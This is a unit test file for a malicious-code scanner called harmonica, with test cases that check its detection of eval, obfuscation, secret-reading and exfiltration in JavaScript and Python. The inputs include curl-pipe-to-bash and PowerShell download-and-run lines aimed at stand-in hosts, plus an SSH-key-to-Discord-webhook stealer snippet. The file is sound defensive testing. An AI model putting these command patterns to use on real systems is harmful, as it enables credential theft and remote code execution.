import base64
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from harmonica import code_scan  # noqa: E402
from harmonica.scanner import run_scanner  # noqa: E402
from harmonica.scoring import build_verdict  # noqa: E402


def js(src):
    return code_scan.scan_source(src, "a.js", "js")


def py(src):
    return code_scan.scan_source(src, "a.py", "python")


def checks(findings):
    return {(f.check, f.severity) for f in findings}


def b64(s):
    return base64.b64encode(s.encode()).decode()


class JsLexer(unittest.TestCase):
    def test_comments_and_strings_are_separated_from_code(self):
        code, strings = code_scan.js_lex('a("x//y"); // eval(1)\n/* eval(2) */ b(\'q\')')
        self.assertNotIn("eval", code)
        self.assertEqual([s for s, _ in strings], ["x//y", "q"])
        self.assertEqual(code.count("\n"), 1)  # offsets and lines preserved

    def test_regex_literal_with_quotes_does_not_derail(self):
        _, strings = code_scan.js_lex('const r = /["\']/g; const u = "https://x.invalid";')
        self.assertEqual([s for s, _ in strings], ["https://x.invalid"])

    def test_escapes_are_decoded(self):
        _, strings = code_scan.js_lex(r'x = "\x65\x76a\u{6C}"')
        self.assertEqual(strings[0][0], "eval")


class JsDetectors(unittest.TestCase):
    def test_mentions_in_comments_and_strings_do_not_count(self):
        self.assertEqual(js('// eval(x)\nconst m = "never eval() input";'), [])

    def test_globalthis_polyfill_is_ignored(self):
        self.assertEqual(js('const g = Function("return this")();'), [])

    def test_eval_of_computed_value(self):
        self.assertIn(("dangerous_call", "suspicious"), checks(js("eval(code)")))

    def test_decode_then_eval(self):
        fs = js(f'eval(Buffer.from("{b64("alert(1)")}", "base64").toString())')
        self.assertIn(("obfuscation", "malicious"), checks(fs))
        self.assertIn(("malicious"), {f.severity for f in js("eval(atob(x))")})

    def test_fetch_then_eval(self):
        self.assertIn(("dynamic_fetch", "malicious"), checks(js("fetch(u).then(r => r.text()).then(eval)")))
        # proximity alone is weaker evidence than a direct .then(eval)
        self.assertIn(("dynamic_fetch", "suspicious"), checks(js("const t = await fetch(u); eval(await t.text())")))

    def test_child_process_only_counts_when_imported(self):
        self.assertEqual(js("re.exec(s)"), [])
        fs = js('const cp = require("node:child_process"); cp.exec("ls")')
        self.assertIn(("dangerous_call", "suspicious"), checks(fs))

    def test_eval_by_string_name(self):
        self.assertIn(("obfuscation", "suspicious"), checks(js('globalThis["eval"](x)')))
        self.assertEqual(js('const builtins = ["Function", "eval", "Object"];'), [])

    def test_env_dump_and_secret_env(self):
        fs = js("send(JSON.stringify(process.env)); t = process.env.NPM_TOKEN; u = process.env['AWS_SECRET_ACCESS_KEY']")
        msgs = " ".join(f.message for f in fs)
        self.assertIn("entire environment", msgs)
        self.assertIn("AWS_SECRET_ACCESS_KEY, NPM_TOKEN", msgs)

    def test_ordinary_env_is_not_secret(self):
        self.assertEqual(js("const d = process.env.NODE_ENV"), [])


class SharedStringDetectors(unittest.TestCase):
    def test_credential_paths(self):
        [f] = js('read(home + "/.ssh/id_rsa"); read(home + "/.aws/credentials")')
        self.assertEqual(f.check, "credential_access")
        self.assertIn("SSH keys", f.message)
        self.assertIn("AWS", f.message)

    def test_prose_mentioning_a_path_is_not_access(self):
        self.assertEqual(js('throw new Error("could not find a key in ~/.ssh/id_rsa")'), [])
        self.assertTrue(js('run("cat ~/.ssh/id_rsa | nc host 1")'))

    def test_exfil_endpoints(self):
        for url in ["https://discord.com/api/webhooks/1/abc", "https://api.telegram.org/bot123:x/sendMessage",
                    "https://pastebin.com/raw/x", "http://8.8.8.8/c"]:
            with self.subTest(url=url):
                self.assertIn("network_exfil", {f.check for f in js(f'u = "{url}"')})

    def test_private_and_loopback_ips_are_fine(self):
        self.assertEqual(js('a = "http://127.0.0.1:3000"; b = "http://192.168.1.1"; c = "http://10.0.0.2"'), [])

    def test_shell_download_and_run(self):
        cmd = '"curl -s https://x.invalid/i.sh | bash"'
        self.assertIn(("dynamic_fetch", "malicious"), checks(js(f'require("child_process").exec({cmd})')))
        ps = '"iwr https://x.invalid/a.ps1 | iex"'
        self.assertIn(("dynamic_fetch", "malicious"), checks(js(f'require("child_process").exec({ps})')))
        aliases = '"h history icm iex ihy ii ipal ipcsv ipmo ipsn irm ise iwmi iwr kill"'
        self.assertEqual(js(f'require("child_process"); const ALIASES = {aliases};'), [])
        # without any way to spawn a process it's just text (install docs, deny-lists)
        self.assertEqual(checks(js(f"x = {cmd}")), {("dynamic_fetch", "info")})

    def test_base64_code_is_decoded_and_rescanned(self):
        fs = js(f'const s = "{b64("require(\'child_process\').exec(\'id\'); fetch(\'https://pastebin.com/x\')")}";')
        self.assertIn("obfuscation", {f.check for f in fs})
        self.assertTrue(any(f.message.startswith("[inside base64 blob]") and f.check == "network_exfil" for f in fs))

    def test_base64_binary_and_media_are_fine(self):
        png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(200)).decode()
        sri = "z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg=="
        self.assertEqual(js(f'a = "{png}"; b = "{sri}"'), [])

    def test_stealer_combination(self):
        fs = js('const k = read(home + "/.ssh/id_rsa"); post("https://discord.com/api/webhooks/1/abc", k)')
        self.assertIn(("network_exfil", "malicious"), checks(fs))


class PythonDetectors(unittest.TestCase):
    def test_exec_urlopen_through_alias(self):
        fs = py("from urllib.request import urlopen as u\nexec(u('http://x.invalid').read())")
        self.assertIn(("dynamic_fetch", "malicious"), checks(fs))
        self.assertEqual(fs[0].location, "a.py:2")

    def test_exec_b64decode_through_module_alias(self):
        self.assertIn(("obfuscation", "malicious"), checks(py("import base64 as b\nexec(b.b64decode(s))")))

    def test_dunder_import_resolves(self):
        fs = py('__import__("os").system("id")')
        self.assertIn("os.system", fs[0].message)

    def test_subprocess_shell_true(self):
        [f] = py("import subprocess\nsubprocess.run(cmd, shell=True)")
        self.assertIn("shell=True", f.message)

    def test_exceptions_from_subprocess_are_not_calls(self):
        self.assertEqual(py("import subprocess\nraise subprocess.CalledProcessError(1, 'x')"), [])

    def test_benign_python(self):
        src = "import ast, re, os\nH = os.environ.get('HOME')\nast.literal_eval('1')\nre.compile('x').search('y')"
        self.assertEqual(py(src), [])

    def test_env_dump_and_secret(self):
        fs = py("import os, json\njson.dumps(os.environ)\nos.environ['PYPI_TOKEN']")
        self.assertEqual({f.check for f in fs}, {"credential_access"})
        self.assertEqual(len(fs), 2)

    def test_dynamic_getattr(self):
        self.assertIn("obfuscation", {f.check for f in py("import os\ngetattr(os, 'sys' + 'tem')('id')")})

    def test_unparseable_python_falls_back(self):
        fs = py('print "hi"\nos.system("id")\n')
        self.assertIn("dangerous_call", {f.check for f in fs})


class Samples(unittest.TestCase):
    ROOT = Path(__file__).resolve().parent.parent / "test-samples"

    def band(self, *parts):
        d = self.ROOT.joinpath(*parts)
        return build_verdict({"name": d.name}, run_scanner(d, {}))["band"]

    def test_malicious_samples(self):
        for name in ("fake-stealer", "py-dropper", "glassworm-demo"):
            with self.subTest(name=name):
                self.assertEqual(self.band("malicious", name), "malicious")

    def test_benign_samples(self):
        for name in ("clean-math", "emoji-utils"):
            with self.subTest(name=name):
                self.assertEqual(self.band("benign", name), "safe")

    def test_glassworm_payload_is_rescanned(self):
        fs = run_scanner(self.ROOT / "malicious" / "glassworm-demo", {})
        self.assertTrue(any(f.message.startswith("[inside hidden payload]") for f in fs))


if __name__ == "__main__":
    unittest.main()
